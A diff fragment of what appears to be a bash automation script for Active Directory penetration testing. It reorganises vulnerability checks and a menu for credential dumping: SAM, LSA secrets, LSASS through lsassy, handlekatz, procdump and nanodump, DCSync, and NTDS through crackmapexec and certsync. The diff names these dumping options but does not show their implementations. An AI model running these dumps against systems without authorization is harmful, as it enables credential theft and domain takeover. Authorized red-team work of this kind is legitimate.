-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M shadowcoerce 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_shadowcoerce_output_${dc_domain}.txt 2>&1
-    echo -e ""
-}
-
-smbsigning_check () {
-    echo -e "${BLUE}[*] Listing servers with SMB signing disabled or not required ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
-        curr_targets="Domain Controllers"
-    fi
-    smb_scan
-    ${crackmapexec} smb ${servers_smb_list} 2>/dev/null | grep "signing:False" | sort -u | tee -a ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt 2>&1
-    if [ ! -s ${output_dir}/Vulnerabilities/cme_smbsigning_output_${dc_domain}.txt ]; then
-        echo -e "${PURPLE}[-] No servers with SMB signing disabled found ${NC}"
-    fi
-    echo -e ""
-}
-
-ntlmv1_check () {
-    echo -e "${BLUE}[*] ntlmv1 check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
-        curr_targets="Domain Controllers"
-    fi
-    smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M ntlmv1 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_ntlmv1_output_${dc_domain}.txt 2>&1
-    echo -e ""
-}
-
-runasppl_check () {
-    echo -e "${BLUE}[*] runasppl check ${NC}"
-    if [ "${kerb_bool}" == true ]; then
-        echo -e "${PURPLE}[-] Targeting DC only${NC}"
-        curr_targets="Domain Controllers"
-    fi
-    smb_scan
-    ${crackmapexec} smb ${servers_smb_list} "${argument_cme[@]}" -M runasppl 2>/dev/null | tee -a ${output_dir}/Vulnerabilities/cme_runasppl_output_${dc_domain}.txt 2>&1
     echo -e ""
 }
 
@@ -1382,13 +1422,7 @@ pwd_dump () {
     laps_dump
     gmsa_dump
     secrets_dump
-    sam_dump
-    lsa_dump
     lsassy_dump
-    handlekatz_dump
-    procdump_dump
-    nanodump_dump
-    masky_dump
     donpapi_dump
 }
 
@@ -1845,14 +1879,16 @@ pwd_menu () {
     echo -e "2) gMSA Dump using crackmapexec"
     echo -e "3) DCSync using secretsdump"
     echo -e "4) Dump SAM and LSA using secretsdump"
-    echo -e "5) Dump SAM using crackmapexec"
-    echo -e "6) Dump LSA secrets using crackmapexec"
-    echo -e "7) Dump LSASS using lsassy"
-    echo -e "8) Dump LSASS using handlekatz"
-    echo -e "9) Dump LSASS using procdump"
-    echo -e "10) Dump LSASS using nanodump"
-    echo -e "11) Dump LSASS using masky (ADCS required)"
-    echo -e "12) Dump secrets using DonPAPI"
+    echo -e "5) Dump NTDS using crackmapexec"
+    echo -e "6) Dump SAM using crackmapexec"
+    echo -e "7) Dump LSA secrets using crackmapexec"
+    echo -e "8) Dump LSASS using lsassy"
+    echo -e "9) Dump LSASS using handlekatz"
+    echo -e "10) Dump LSASS using procdump"
+    echo -e "11) Dump LSASS using nanodump"
+    echo -e "12) Dump LSASS using masky (ADCS required)"
+    echo -e "13) Dump secrets using DonPAPI"
+    echo -e "14) Dump NTDS using certsync"
     echo -e "99) Back"
 
     read -p "> " option_selected </dev/tty
@@ -1889,42 +1925,52 @@ pwd_menu () {
         ;;
 
         5)
-        sam_dump
+        ntds_dump
         pwd_menu
         ;;
 
         6)
-        lsa_dump
+        sam_dump
         pwd_menu
         ;;
 
         7)
-        lsassy_dump
+        lsa_dump
         pwd_menu
         ;;
 
         8)
-        handlekatz_dump
+        lsassy_dump
         pwd_menu
         ;;
 
         9)
-        procdump_dump
+        handlekatz_dump
         pwd_menu
         ;;
 
         10)
-        nanodump_dump
+        procdump_dump
         pwd_menu
         ;;
 
         11)
-        masky_dump
+        nanodump_dump
         pwd_menu
         ;;
 
         12)
+        masky_dump
+        pwd_menu
+        ;;
+
+        13)
         donpapi_dump
+        pwd_menu
+        ;;
+
+        14)
+        certsync_ntds_dump
         pwd_menu
         ;;
 
@@ -1978,6 +2024,7 @@ config_menu () {
         if [ ! -f "${certipy}" ] ; then echo -e "${RED}[-] certipy is not installed${NC}"; else echo -e "${GREEN}[+] certipy is installed${NC}"; fi
         if [ ! -f "${ldeep}" ] ; then echo -e "${RED}[-] ldeep is not installed${NC}"; else echo -e "${GREEN}[+] ldeep is installed${NC}"; fi
         if [ ! -f "${pre2k}" ] ; then echo -e "${RED}[-] pre2k is not installed${NC}"; else echo -e "${GREEN}[+] pre2k is installed${NC}"; fi
+        if [ ! -f "${certsync}" ] ; then echo -e "${RED}[-] certsync is not installed${NC}"; else echo -e "${GREEN}[+] certsync is installed${NC}"; fi
         if [ ! -f "${scripts_dir}/windapsearch" ] ; then echo -e "${RED}[-] windapsearch is not installed${NC}"; else echo -e "${GREEN}[+] windapsearch is installed${NC}"; fi
         if [ ! -x "${scripts_dir}/windapsearch" ] ; then echo -e "${RED}[-] windapsearch is not executable${NC}"; else echo -e "${GREEN}[+] windapsearch is executable${NC}"; fi
         if [ ! -f "${enum4linux_py}" ] ; then echo -e "${RED}[-] enum4linux-ng is not installed${NC}"; else echo -e "${GREEN}[+] enum4linux-ng is installed${NC}"; fi
